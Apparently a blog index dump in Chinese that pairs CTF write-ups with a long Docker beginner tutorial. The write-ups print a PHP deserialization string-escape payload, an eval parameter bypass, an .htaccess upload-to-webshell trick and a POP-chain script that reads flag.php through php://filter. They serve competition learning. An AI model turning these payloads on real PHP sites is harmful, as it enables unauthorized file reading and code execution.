$_SESSION[&#x27;username&#x27;];\t\tif(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))\t\t\tdie(&#x27;Invalid phone&#x27;);\t\tif(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))\t\t\tdie(&#x27;Invalid email&#x27;);\t\t\t\tif(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)\t\t\tdie(&#x27;Invalid nickname&#x27;);\t\t$file = $_FILES[&#x27;photo&#x27;];\t\tif($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)\t\t\tdie(&#x27;Photo size error&#x27;);\t\tmove_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));\t\t$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];\t\t$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];\t\t$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];\t\t$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);\t\t$user-&gt;update_profile($username, serialize($profile));\t\techo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;\t&#125;\telse &#123;?&gt;\n对于用户post进入的数据进行正则匹配的检测，其中还有serialize敏感函数\n4. profile.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;] == null) &#123;\t\tdie(&#x27;Login First&#x27;);\t\t&#125;\t$username = $_SESSION[&#x27;username&#x27;];\t$profile=$user-&gt;show_profile($username);\tif($profile  == null) &#123;\t\theader(&#x27;Location: update.php&#x27;);\t&#125;\telse &#123;\t\t$profile = unserialize($profile);\t\t$phone = $profile[&#x27;phone&#x27;];\t\t$email = $profile[&#x27;email&#x27;];\t\t$nickname = $profile[&#x27;nickname&#x27;];\t\t$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;\n先反序列化profile，之后拿到phone等数据，最后利用file_get_contents敏感函数读取photo文件，并编码，这里大概就是漏洞点。\n5. class.php\n&lt;?php\t$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;\t$config[&#x27;username&#x27;] = &#x27;root&#x27;;\t$config[&#x27;password&#x27;] = &#x27;&#x27;;\t$config[&#x27;database&#x27;] = &#x27;&#x27;;\t$flag = &#x27;&#x27;;?&gt;\n数据库的一些配置，不过显示了flag，那很明显我们要与file_get_contents配合读取config.php，进而得到flag\n那么对应一下页面\n\n代码呢，会对我们在此页面传入的数据进行相应的正则匹配，不用想，这里便需要我们去绕过了，那看一下关键代码\n\n\n这里可以看到其重点防守了nickname，再看一下update_profile函数\n\n发现一个filter函数的检测，跟踪看一下\n\n发现对一些敏感且危险的字符进行了过滤，会将其替换为hacker，这里估计就可以想到反序列化的字符串逃逸了\n我们先构造payload看看：\n&lt;?phpclass b&#123;\tpublic $phone = &quot;12345678901&quot;;\tpublic $email = &quot;123@qq.com&quot;;\tpublic $nickname = &quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;\tpublic $photo = &quot;config.php&quot;;&#125;$a=new b();$profile = serialize($a);echo $profile;?&gt;\nO:1:&quot;b&quot;:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:10:&quot;222@qq.com&quot;;s:8:&quot;nickname&quot;;s:6:&quot;where&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;\n由于where会转换为hacker，而且那几个均是五个字符，我们利用where+字符串逃逸看看\n那么这里变换以后字符串会变长，那我们应该就是让前面的把我们想要的逃逸出去，这里取出关键的看看\n&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;   //34个字符\n很明显我们需要写34个where即可，然后剩下的34个字符就不会被正则匹配，即下面代码，在反序列化时就会被成功当成photo，那么我们就可以成功读取到config.php了，构造如下poc\nO:1:&quot;b&quot;:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:10:&quot;222@qq.com&quot;;s:8:&quot;nickname&quot;;s:170:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;\n在此基础上要在photo前面的s前加一个花括号，以达到闭合的效果\nO:1:&quot;b&quot;:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:10:&quot;222@qq.com&quot;;s:8:&quot;nickname&quot;;s:170:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;\n\n注意上图的检测，preg_match只能处理字符串，当传入的subject是数组时会返回false，并且strlen处理数组的时候也会返回false\n因此我们bp抓包看看\n\n做如图的修改即可放包即可成功update\n\n查看源代码，base64解码即可\n\n\n","categories":["内部竞赛"]},{"title":"内部竞赛1","url":"/2023/08/06/%E5%86%85%E9%83%A8%E7%AB%9E%E8%B5%9B%E9%A2%981/","content":"0x01 web1\n打开题目，没什么发现，随后用dirsearch扫目录，可以发现存在robots.txt，访问该文件发现如下PHP文件\n\n访问该文件发现源码\n审计发现利用PHP特性\n令a=a通过PHP会将其判断为数字0，成功绕过\nkey1与key2的sha1碰撞可以用数组绕过\n最后的code利用变量替换?code=eval($_GET[1]);&amp;1=echo tac flag.php ;可以绕过对code的正则\n\n0x02 web2\n直接bp抓包进行验证\n\n如图限制了php后缀名文件\n修改为jpg后，发现如图\n\n那我们需要修改content类型看看\n\n绕过之后还是不行，那么他应该是检测了文件内容参考了佬的文章发现：这里的PHP版本为： PHP/5.6.23 ，可以使用 eval($_POST[‘bcx’]); 绕过那么文件名这里可以.htaccess文件将别的后缀名文件内容解析为php程序\nAddType application/x-httpd-php .bcx\n\n然后上传shell\n\n然后上传shell访问上传路径发现禁用了如上图所示的函数，估计禁了很多，那么我们用目录浏览函数试试\n\n成功看到flag，访问一下，当然这里也可以蚁剑连接更简便\n\n0x03 web3\n简单的反序列化\n\n先上几个魔法函数\n__construct()//当一个对象创建时被调用__toString() //当一个对象被当作一个字符串使用__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)__get()//读取不可访问属性的值时调用__invoke()//当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用\n先找关键函数发现include函数，而调用该函数需要调用ikun函数，这样我们需要触发invoke函数才可以触发invoke需要当类对象被当做函数调用时触发，那么很明显可以看到try_this类中的function参数，即将aaa赋值为getflag即可。\n值得注意的是aaa所在的方法中存在get魔术方法，而当我们访问一个类中不存在的属性时，才能触发该方法，因此转到lanqiu类中。\n接下来看lanqiu类，其中wakeup方法没多大用处，只是对source做了一个限制，注意其中的tostring方法，与echo配合即可调用，这时将kun赋值为trythis，source赋值为lanqiu，即可成功调用get方法。\n最后将eval赋值为 $eval=“php://filter/read=convert.base64-encode/resource=flag.php”;成功读取到flag文件\npop链如下\n&lt;?phpclass get_flag &#123;protected $eval=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;class lanqiu&#123;public $source;public $kun;public function __construct()&#123;$this-&gt;kun = new Try_this();&#125;&#125;class Try_this&#123;public $aaa;&#125;$a = new lanqiu();$a-&gt;source = new lanqiu();$a-&gt;source-&gt;kun-&gt;aaa= new get_flag();echo urlencode(serialize($a));?&gt;\n\nbase64解码即可\n\n","categories":["内部竞赛"]},{"title":"docker基础","url":"/2023/08/06/Docker%E7%AE%80%E4%BB%8B/","content":"1 Docker详解\n1.1 是什么？\n1.1.1 问题：为什么会有docker出现？\n假定您在开发一个尚硅谷的谷粒商城，您使用的是一台笔记本电脑而且您的开发环境具有特定的配置。其他开发人员身处的环境配置也各有不同。您正在开发的应用依赖于您当前的配置且还要依赖于某些配置文件。此外，您的企业还拥有标准化的测试和生产环境，且具有自身的配置和一系列支持文件。您希望尽可能多在本地模拟这些环境而不产生重新创建服务器环境的开销。请问？\n您要如何确保应用能够在这些环境中运行和通过质量检测？并且在部署过程中不出现令人头疼的版本、配置问题，也无需重新编写代码和进行故障修复？\n答案就是使用容器。Docker之所以发展如此迅速，也是因为它对此给出了一个标准化的解决方案-----系统平滑移植，容器虚拟化技术。\n环境配置相当麻烦，换一台机器，就要重来一次，费力费时。很多人想到，能不能从根本上解决问题，软件可以带环境安装？也就是说，安装的时候，把原始环境一模一样地复制过来。开发人员利用 Docker 可以消除协作编码时“在我的机器上可正常工作”的问题。\n\n之前在服务器配置一个应用的运行环境，要安装各种软件，就拿尚硅谷电商项目的环境来说，Java/RabbitMQ/MySQL/JDBC驱动包等。安装和配置这些东西有多麻烦就不说了，它还不能跨平台。假如我们是在 Windows 上安装的这些环境，到了 Linux 又得重新装。况且就算不跨操作系统，换另一台同样操作系统的服务器，要移植应用也是非常麻烦的。\n传统上认为，软件编码开发/测试结束后，所产出的成果即是程序或是能够编译执行的二进制字节码等(java为例)。而为了让这些程序可以顺利执行，开发团队也得准备完整的部署文件，让维运团队得以部署应用程式，开发需要清楚的告诉运维部署团队，用的全部配置文件+所有软件环境。不过，即便如此，仍然常常发生部署失败的状况。Docker的出现使得Docker得以打破过去「程序即应用」的观念。透过镜像(images)将作业系统核心除外，运作应用程式所需要的系统环境，由下而上打包，达到应用程式跨平台间的无缝接轨运作。\n1.1.2 Docker理念\nDocker是基于Go语言实现的云开源项目。\nDocker的主要目标是“Build，Ship and Run Any App,Anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次镜像，处处运行”。\n\nLinux容器技术的出现就解决了这样一个问题，而 Docker 就是在它的基础上发展过来的。将应用打成镜像，通过镜像成为运行在Docker容器上面的实例，而 Docker容器在任何操作系统上都是一致的，这就实现了跨平台、跨服务器。只需要一次配置好环境，换到别的机子上就可以一键部署好，大大简化了操作。\n1.1.3 一句话\n解决了运行环境和配置问题的软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。\n1.2 容器与虚拟机比较\n1.2.1 容器发展简史\n\n\n1.2.2 传统虚拟机技术\n虚拟机（virtual machine）就是带环境安装的一种解决方案。\n它可以在一种操作系统里面运行另一种操作系统，比如在Windows10系统里面运行Linux系统CentOS7。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。\n\n虚拟机的缺点：\n1    资源占用多               2    冗余步骤多                 3    启动慢\n1.2.3 容器虚拟化技术\n由于前面虚拟机存在某些缺点，Linux发展出了另一种虚拟化技术：\nLinux容器(Linux Containers，缩写为 LXC)\nLinux容器是与系统其他部分隔离开的一系列进程，从另一个镜像运行，并由该镜像提供支持进程所需的全部文件。容器提供的镜像包含了应用的所有依赖项，因而在从开发到测试再到生产的整个过程中，它都具有可移植性和一致性。\nLinux 容器不是模拟一个完整的操作系统而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。\n\n1.2.4 对比\n\n比较了 Docker 和传统虚拟化方式的不同之处：\n*传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；\n*容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。\n* 每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。\n1.3 能干嘛\n1.3.1 技术职级变化\ncoder -&gt; programmer -&gt; software engineer -&gt; DevOps engineer\n1.3.2 开发/运维（DevOps）新一代开发工程师\n1.3.2.1 一次构建、随处运行\n更快速的应用交付和部署\n传统的应用开发完成后，需要提供一堆安装程序和配置说明文档，安装部署后需根据配置文档进行繁杂的配置才能正常运行。Docker化之后只需要交付少量容器镜像文件，在正式生产环境加载镜像并运行即可，应用安装配置在镜像里已经内置好，大大节省部署配置和测试验证时间。\n更便捷的升级和扩缩容\n随着微服务架构和Docker的发展，大量的应用会通过微服务方式架构，应用的开发构建将变成搭乐高积木一样，每个Docker容器将变成一块“积木”，应用的升级将变得非常容易。当现有的容器不足以支撑业务处理时，可通过镜像运行新的容器进行快速扩容，使应用系统的扩容从原先的天级变成分钟级甚至秒级。\n更简单的系统运维\n应用容器化运行后，生产环境运行的应用可与开发、测试环境的应用高度一致，容器会将应用程序相关的环境和状态完全封装起来，不会因为底层基础架构和操作系统的不一致性给应用带来影响，产生新的BUG。当出现程序异常时，也可以通过测试环境的相同容器进行快速定位和修复。\n更高效的计算资源利用\nDocker是内核级虚拟化，其不像传统的虚拟化技术一样需要额外的Hypervisor支持，所以在一台物理机上可以运行很多个容器实例，可大大提升物理服务器的CPU和内存的利用率。\n1.3.2.2 Docker应用场景\n\n1.3.3 哪些企业在使用\n新浪\n\n\n\n\n美团\n\n\n蘑菇街\n\n\n1.4 去哪下\n1.4.1 官网\ndocker官网：http://www.docker.com\n1.4.2 仓库\nDocker Hub官网: https://hub.docker.com/\n2 Docker安装\n2.1 前提说明\nCentOS Docker 安装\n\n前提条件\n目前，CentOS 仅发行版本中的内核支持 Docker。Docker 运行在CentOS 7 (64-bit)上，\n要求系统为64位、Linux系统内核版本为 3.8以上，这里选用Centos7.x\n查看自己的内核\nuname命令用于打印当前系统相关信息（内核版本号、硬件架构、主机名称和操作系统类型等）。\n\n2.2 Docker的基本组成\n\nDocker是一个Client-Server结构的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。可以对比mysql演示对比讲解\n\n2.2.1 镜像(image)\nDocker 镜像（Image）就是一个只读的模板。镜像可以用来创建 Docker 容器，一个镜像可以创建很多容器。\n它也相当于是一个root文件系统。比如官方镜像 centos:7 就包含了完整的一套 centos:7 最小系统的 root 文件系统。\n相当于容器的“源代码”，docker镜像文件类似于Java的类模板，而docker容器实例类似于java中new出来的实例对象。\n\n2.2.2 容器(container)\n1 从面向对象角度\nDocker 利用容器（Container）独立运行的一个或一组应用，应用程序或服务运行在容器里面，容器就类似于一个虚拟化的运行环境，容器是用镜像创建的运行实例。就像是Java中的类和实例对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器为镜像提供了一个标准的和隔离的运行环境，它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台\n2 从镜像容器角度\n可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。\n2.2.3 仓库(repository)\n仓库（Repository）是集中存放镜像文件的场所。\n类似于\nMaven仓库，存放各种jar包的地方；\ngithub仓库，存放各种git项目的地方；\nDocker公司提供的官方registry被称为Docker Hub，存放各种镜像模板的地方。\n仓库分为公开仓库（Public）和私有仓库（Private）两种形式。\n最大的公开仓库是 Docker Hub(https://hub.docker.com/)，\n存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云 、网易云等。\n2.2.4 小总结\n需要正确的理解仓库/镜像/容器这几个概念:\nDocker 本身是一个容器运行载体或称之为管理引擎。我们把应用程序和配置依赖打包好形成一个可交付的运行环境，这个打包好的运行环境就是image镜像文件。只有通过这个镜像文件才能生成Docker容器实例(类似Java中new出来一个对象)。\nimage文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。\n镜像文件\n*  image 文件生成的容器实例，本身也是一个文件，称为镜像文件。\n容器实例\n*  一个容器运行一种服务，当我们需要的时候，就可以通过docker客户端创建一个对应的运行实例，也就是我们的容器\n仓库\n* 就是放一堆镜像的地方，我们可以把镜像发布到仓库中，需要的时候再从仓库中拉下来就可以了。\n2.3 Docker平台架构图解(架构版)\nDocker 是一个 C/S 模式的架构，后端是一个松耦合架构，众多模块各司其职。\n\n\n2.4 安装步骤\nCentOS7安装Docker：https://docs.docker.com/engine/install/centos/\n2.4.1 确定你是CentOS7及以上版本\ncat /etc/redhat-release\n2.4.2 卸载旧版本\nhttps://docs.docker.com/engine/install/centos/\n\n2.4.3 yum安装gcc相关\nCentOS7能上外网\nyum -y install gccyum -y install gcc-c++\n2.4.4 安装需要的软件包\n官网要求\n\n执行命令\nyum install -y yum-utils\n2.4.5 设置stable镜像仓库\n❌\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n\n报错：\n1   [Errno 14] curl#35 - TCP connection reset by peer\n2   [Errno 12] curl#35 - Timeout\n✔️\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n\n2.4.6 更新yum软件包索引\nyum makecache fast\n2.4.7 安装DOCKER CE\nyum -y install docker-ce docker-ce-cli containerd.io\n官网要求\n\n执行结果\n\n\n2.4.8 启动docker\nsystemctl start docker\n2.4.9 测试\ndocker version\n\ndocker run hello-world\n\n2.4.10 卸载\nsystemctl stop docker yum remove docker-ce docker-ce-cli containerd.iorm -rf /var/lib/dockerrm -rf /var/lib/containerd\n2.5 阿里云镜像加速\n\n是什么\n\nhttps://promotion.aliyun.com/ntms/act/kubernetes.html\n\n\n注册一个属于自己的阿里云账户(可复用淘宝账号)\n\n\n获得加速器地址连接\n\n\n\n登陆阿里云开发者平台\n\n\n\n\n\n\n\n点击控制台\n选择容器镜像服务\n\n\n\n\n\n\n\n获取加速器地址\n\n\n\n\n\n\n粘贴脚本直接执行\n\n\n\n直接粘\n\n\n\n\n\n\n\n或者分步骤都行\n\n\n\nmkdir -p /etc/dockervim  /etc/docker/daemon.json\n\n重启服务器\n\nsystemctl daemon-reloadsystemctl restart docker\n2.6 永远的HelloWorld\n启动Docker后台容器(测试运行 hello-world)\ndocker run hello-world\n\n输出这段提示以后，hello world就会停止运行，容器自动终止。\nrun干了什么？\n\n2.7 底层原理\n为什么Docker会比VM虚拟机快\n(1)docker有着比虚拟机更少的抽象层\n由于docker不需要Hypervisor(虚拟机)实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。\n(2)docker利用的是宿主机的内核,而不需要加载操作系统OS内核\n当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。进而避免引寻、加载操作系统内核返回等比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载OS,返回新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返回过程,因此新建一个docker容器只需要几秒钟。\n\n\n3 Docker常用命令\n3.1 帮助启动类命令\n\n启动docker： systemctl start docker\n停止docker： systemctl stop docker\n重启docker： systemctl restart docker\n查看docker状态： systemctl status docker\n开机启动： systemctl enable docker\n查看docker概要信息： docker info\n查看docker总体帮助文档： docker --help\n查看docker命令帮助文档： docker 具体命令 --help\n\n3.2 镜像命令\n3.2.1docker images\n列出本地主机上的镜像\n\n各个选项说明:\nREPOSITORY：表示镜像的仓库源TAG：镜像的标签版本号IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小同一仓库源可以有多个 TAG版本，代表这个仓库源的不同个版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像OPTIONS说明：-a :列出本地所有的镜像（含历史映像层）-q :只显示镜像ID。\n3.2.2docker search 某个XXX镜像名字\n网站：https://hub.docker.com\n命令：docker search [OPTIONS] 镜像名字\n\n\nOPTIONS说明：\n–limit : 只列出N个镜像，默认25个\ndocker search --limit 5 redis\n3.2.3docker pull 某个XXX镜像名字\n下载镜像\ndocker pull 镜像名字[:TAG]docker pull 镜像名字\n没有TAG就是最新版\n等价于\ndocker pull 镜像名字:latestdocker pull ubuntu\n\n3.2.4docker system df \n查看镜像/容器/数据卷所占的空间\n\n3.2.5docker rmi 某个XXX镜像名字ID\n删除镜像\n删除单个\ndocker rmi -f 镜像ID\n删除多个\ndocker rmi -f 镜像名1:TAG 镜像名2:TAG \n删除全部\ndocker rmi -f $(docker images -qa)\n3.2.6 面试题：谈谈docker虚悬镜像是什么？\n是什么？\n仓库名、标签都是的镜像，俗称虚悬镜像dangling image\n长什么样？\n\n3.3 容器命令\n3.3.1 有镜像才能创建容器， 这是根本前提(下载一个CentOS或者ubuntu镜像演示)\n\ndocker pull centosdocker pull ubuntu\n\n3.3.2 新建+启动容器\ndocker run [OPTIONS] IMAGE [COMMAND] [ARG...]\nOPTIONS说明OPTIONS说明（常用）：有些是一个减号，有些是两个减号--name=&quot;容器新名字&quot;       为容器指定一个名称；(不指定的话,系统随机指定)-d: 后台运行容器并返回容器ID，也即启动守护式容器(后台运行)；-i：以交互模式运行容器，通常与 -t 同时使用；-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；也即启动交互式容器(前台有伪终端，等待交互)；-P: 随机端口映射，大写P-p: 指定端口映射，小写p\n\n启动交互式容器(前台命令行)\n\n#使用镜像centos:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。\ndocker run -it centos /bin/bash \n参数说明：\n-i: 交互式操作。\n-t: 终端。\ncentos : centos 镜像。\n/bin/bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。\n要退出终端，直接输入 exit:\n3.3.3 列出当前所有正在运行的容器\ndocker ps [OPTIONS]\nOPTIONS说明（常用）：\n-a :列出当前所有正在运行的容器+历史上运行过的\n-l :显示最近创建的容器。\n-n：显示最近n个创建的容器。\n-q :静默模式，只显示容器编号。\n3.3.4 退出容器\n两种退出方式\nexit\nrun进去容器，exit退出，容器停止\nctrl+p+q\nrun进去容器，ctrl+p+q退出，容器不停止\n3.3.5 启动已停止运行的容器\ndocker start 容器ID或者容器名\n3.3.6 重启容器\ndocker restart 容器ID或者容器名\n3.3.7 停止容器\ndocker stop 容器ID或者容器名\n3.3.8 强制停止容器\ndocker kill 容器ID或容器名\n3.3.9 删除已停止的容器\ndocker rm 容器ID\n一次性删除多个容器实例\ndocker rm -f $(docker ps -a -q)docker ps -a -q | xargs docker rm\n3.3.10 重要\n\n有镜像才能创建容器，这是根本前提(下载一个Redis6.0.8镜像演示)\n启动守护式容器(后台服务器)\n\n在大部分的场景下，我们希望 docker 的服务是在后台运行的， 我们可以过 -d 指定容器的后台运行模式。\ndocker run -d 容器名\n#使用镜像centos:latest以后台模式启动一个容器\ndocker run -d centos\n问题：然后docker ps -a 进行查看, 会发现容器已经退出\n很重要的要说明的一点: Docker容器后台运行,就必须有一个前台进程。\n容器运行的命令如果不是那些一直挂起的命令（比如运行top，tail），就是会自动退出的。\n这个是docker的机制问题,比如你的web容器,我们以nginx为例，正常情况下,我们配置启动服务只需要启动响应的service即可。例如service nginx start。但是,这样做,nginx为后台进程模式运行,就导致docker前台没有运行的应用，这样的容器后台启动后，会立即自杀因为他觉得他没事可做了。所以，最佳的解决方案是将你要运行的程序以前台进程的形式运行，常见就是命令行模式，表示我还有交互操作，别中断。\nredis 前后台启动演示case\n前台交互式启动\ndocker run -it redis:6.0.8\n后台守护式启动\ndocker run -d redis:6.0.8\n\n查看容器日志\n\ndocker logs 容器ID\n\n查看容器内运行的进程\n\ndocker top 容器ID\n\n查看容器内部细节\n\ndocker inspect 容器ID\n\n进入正在运行的容器并以命令行交互\n\ndocker exec -it 容器ID bashShell\n\n\n重新进入docker attach 容器ID\n上述两个区别？\nattach 直接进入容器启动命令的终端，不会启动新的进程 用exit退出，会导致容器的停止。\n\nexec 是在容器中打开新的终端，并且可以启动新的进程 用exit退出，不会导致容器的停止。\n\n推荐大家使用 docker exec 命令，因为退出容器终端，不会导致容器的停止。\n用之前的redis容器实例进入试试\n进入redis服务\ndocker exec -it 容器ID /bin/bashdocker exec -it 容器ID redis-cli\n一般用-d后台启动的程序，再用exec进入对应容器实例\n\n从容器内拷贝文件到主机上\n\n容器→主机\ndocker cp 容器ID:容器内路径 目的主机路径\n\n\n导入和导出容器\n\nexport 导出容器的内容留作为一个tar归档文件[对应import命令]\nimport 从tar包中的内容创建一个新的文件系统再导入为镜像[对应export]\n案例\ndocker export 容器ID &gt; 文件名.tar\n\ncat 文件名.tar | docker import - 镜像用户/镜像名:镜像版本号\n\n3.4 小总结\n\nattach    Attach to a running container                 # 当前 shell 下 attach 连接指定运行镜像build     Build an image from a Dockerfile              # 通过 Dockerfile 定制镜像commit    Create a new image from a container changes   # 提交当前容器为新的镜像cp        Copy files/folders from the containers filesystem to the host path   #从容器中拷贝指定文件或者目录到宿主机中create    Create a new container                        # 创建一个新的容器，同 run，但不启动容器diff      Inspect changes on a container&#x27;s filesystem   # 查看 docker 容器变化events    Get real time events from the server          # 从 docker 服务获取容器实时事件exec      Run a command in an existing container        # 在已存在的容器上运行命令export    Stream the contents of a container as a tar archive   # 导出容器的内容流作为一个 tar 归档文件[对应 import ]history   Show the history of an image                  # 展示一个镜像形成历史images    List images                                   # 列出系统当前镜像import    Create a new filesystem image from the contents of a tarball # 从tar包中的内容创建一个新的文件系统映像[对应export]info      Display system-wide information               # 显示系统相关信息inspect   Return low-level information on a container   # 查看容器详细信息kill      Kill a running container                      # kill 指定 docker 容器load      Load an image from a tar archive              # 从一个 tar 包中加载一个镜像[对应 save]login     Register or Login to the docker registry server    # 注册或者登陆一个 docker 源服务器logout    Log out from a Docker registry server          # 从当前 Docker registry 退出logs      Fetch the logs of a container                 # 输出当前容器日志信息port      Lookup the public-facing port which is NAT-ed to PRIVATE_PORT    # 查看映射端口对应的容器内部源端口pause     Pause all processes within a container        # 暂停容器ps        List containers                               # 列出容器列表pull      Pull an image or a repository from the docker registry server   # 从docker镜像源服务器拉取指定镜像或者库镜像push      Push an image or a repository to the docker registry server    # 推送指定镜像或者库镜像至docker源服务器restart   Restart a running container                   # 重启运行的容器rm        Remove one or more containers                 # 移除一个或者多个容器rmi       Remove one or more images       # 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]run       Run a command in a new container              # 创建一个新的容器并运行一个命令save      Save an image to a tar archive                # 保存一个镜像为一个 tar 包[对应 load]search    Search for an image on the Docker Hub         # 在 docker hub 中搜索镜像start     Start a stopped containers                    # 启动容器stop      Stop a running containers                     # 停止容器tag       Tag an image into a repository                # 给源中镜像打标签top       Lookup the running processes of a container   # 查看容器中运行的进程信息unpause   Unpause a paused container                    # 取消暂停容器version   Show the docker version information           # 查看 docker 版本号wait      Block until a container stops, then print its exit code   # 截取容器停止时的退出状态值\n4 Docker镜像\n4.1 是什么\n是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，我们把应用程序和配置依赖打包好形成一个可交付的运行环境(包括代码、运行时需要的库、环境变量和配置文件等)，这个打包好的运行环境就是image镜像文件。\n只有通过这个镜像文件才能生成Docker容器实例(类似Java中new出来一个对象)。\n4.1.1 分层的镜像\n以我们的pull为例，在下载的过程中我们可以看到docker的镜像好像是在一层一层的在下载\n\n4.1.2 UnionFS（联合文件系统）\nUnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。Union 文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。\n\n特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录\n4.1.3 Docker镜像加载原理\ndocker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。\nbootfs(boot file system)主要包含bootloader和kernel, bootloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是引导文件系统bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。\nrootfs (root file system) ，在bootfs之上。包含的就是典型 Linux 系统中的 /dev, /proc, /bin, /etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。\n\n平时我们安装进虚拟机的CentOS都是好几个G，为什么docker这里才200M？？\n\n对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供 rootfs 就行了。由此可见对于不同的linux发行版, bootfs基本是一致的, rootfs会有差别, 因此不同的发行版可以公用bootfs。\n4.1.4 为什么 Docker 镜像要采用这种分层结构呢\n镜像分层最大的一个好处就是共享资源，方便复制迁移，就是为了复用。\n比如说有多个镜像都从相同的 base 镜像构建而来，那么 Docker Host 只需在磁盘上保存一份 base 镜像；\n同时内存中也只需加载一份 base 镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。\n4.2 重点理解\nDocker镜像层都是只读的，容器层是可写的。当容器启动时，一个新的可写层被加载到镜像的顶部。 